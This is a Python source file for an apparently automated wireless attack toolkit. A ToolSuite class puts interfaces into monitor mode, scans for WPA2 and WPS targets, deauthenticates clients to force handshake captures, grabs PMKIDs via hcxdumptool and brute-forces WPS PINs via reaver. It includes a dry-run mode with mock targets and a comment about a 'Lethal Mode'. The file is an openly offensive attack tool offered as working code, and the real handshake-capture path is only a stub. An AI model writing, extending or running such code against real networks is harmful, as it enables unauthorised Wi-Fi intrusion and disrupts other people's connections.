import subprocess
import time
import random
from typing import List, Dict, Optional
from core.logger import log
from core.knowledge_base import KnowledgeBase, NetworkTarget
from core.wrappers.hcx import HCXDumptoolWrapper
from core.wrappers.aircrack import AireplayWrapper
from core.wrappers.reaver import ReaverWrapper

class ToolSuite:
    def __init__(self):
        self.kb = KnowledgeBase()
        dry = self.kb.environment.dry_run
        
        # Initialize sub-wrappers
        self.hcx = HCXDumptoolWrapper(dry_run=dry)
        self.air = AireplayWrapper(dry_run=dry)
        self.reaver = ReaverWrapper(dry_run=dry)

    def _run_command(self, cmd: List[str]) -> str:
        if self.kb.environment.dry_run:
            log.debug(f"[DRY-RUN] Executing: {' '.join(cmd)}")
            return ""
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.stdout
        except Exception as e:
            log.error(f"Command failed: {e}")
            return ""

    def enable_monitor_mode(self, interface: str) -> str:
        log.info(f"Enabling monitor mode on {interface}...")
        if self.kb.environment.dry_run:
            self.kb.environment.mon_interface = f"{interface}mon"
            return f"{interface}mon"
        
        self._run_command(["airmon-ng", "check", "kill"])
        self._run_command(["airmon-ng", "start", interface])
        return f"{interface}mon"

    def scan_networks(self, interface: str, duration: int = 10) -> List[NetworkTarget]:
        # Basic scanning via airodump (mocked or real)
        # In Lethal Mode, we also scan for WPS now
        log.info(f"Scanning for networks (and WPS) on {interface} for {duration}s...")
        
        # 1. Run standard scan
        targets = []
        if self.kb.environment.dry_run:
            time.sleep(1) # Simulate work
            t1 = NetworkTarget(
                bssid="00:11:22:33:44:55", 
                ssid="Corp_WiFi", 
                channel=6, 
                encryption="WPA2", 
                signal_strength=-50,
                wps_enabled=True,
                wps_locked=False
            )
            t2 = NetworkTarget(
                bssid="AA:BB:CC:DD:EE:FF", 
                ssid="Free_Guest", 
                channel=1, 
                encryption="OPEN", 
                signal_strength=-70
            )
            targets = [t1, t2]

        # 2. Run WPS scan (wash) and overlay data
        wps_data = self.reaver.scan_wps(interface)
        for t in targets:
            if t.bssid in wps_data:
                t.wps_enabled = True
                t.wps_locked = wps_data[t.bssid]["locked"]
                t.wps_version = wps_data[t.bssid]["version"]
                
        return targets

    def capture_handshake(self, interface: str, target: NetworkTarget, duration: int = 30) -> bool:
        # Classic Deauth + Capture
        log.info(f"Initiating Handshake Capture on {target.ssid}...")
        
        # 1. Deauth clients to force roam
        self.air.deauth(interface, target.bssid)
        
        # 2. Wait for handshake (simulation)
        if self.kb.environment.dry_run:
            time.sleep(2)
            # Higher success rate if clients exist (mock logic)
            success = True
            if success:
                target.handshake_captured = True
            return success
        
        return False
        
    def capture_pmkid(self, interface: str, target: NetworkTarget) -> bool:
        success = self.hcx.capture_pmkid(interface, target.bssid)
        if success:
            target.pmkid_captured = True
        return success
        
    def attack_wps(self, interface: str, target: NetworkTarget) -> bool:
        pin = self.reaver.attack_wps(interface, target.bssid)
        if pin:
            target.wps_pin = pin
            return True
        return False
